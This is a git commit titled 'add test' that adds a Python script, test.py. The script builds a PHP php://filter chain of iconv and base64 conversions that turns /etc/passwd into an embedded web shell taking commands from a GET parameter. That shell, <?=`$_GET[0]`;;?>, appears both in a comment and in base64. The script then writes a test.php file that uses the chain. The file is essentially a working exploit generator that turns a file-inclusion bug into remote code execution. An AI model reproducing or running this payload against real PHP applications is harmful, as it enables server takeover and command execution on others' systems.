0a10a5b051eaf7b98a31c2a0001a1222ca291a6b
Yuhang Wu <ykw5296@i4-l-uxx16-02.ad.psu.edu>
2021-12-31 18:32:48 -0500

    add test

---
+++ test.py
@@ -0,0 +1,27 @@
+file_to_use = "/etc/passwd"
+
+#<?=`$_GET[0]`;;?>
+base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"
+
+# generate some garbage base64
+filters = "convert.iconv.UTF8.CSISO2022KR|"
+filters += "convert.base64-encode|"
+# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+filters += "convert.iconv.UTF8.UTF7|"
+
+
+for c in base64_payload[::-1]:
+        filters += open('./res/'+c).read() + "|"
+        # decode and reencode to get rid of everything that isn't valid base64
+        filters += "convert.base64-decode|"
+        filters += "convert.base64-encode|"
+        # get rid of equal signs
+        filters += "convert.iconv.UTF8.UTF7|"
+
+filters += "convert.base64-decode"
+
+final_payload = f"php://filter/{filters}/resource={file_to_use}"
+
+with open('test.php','w') as f:
+    f.write('<?php echo file_get_contents("'+final_payload+'");?>')
+print(final_payload)
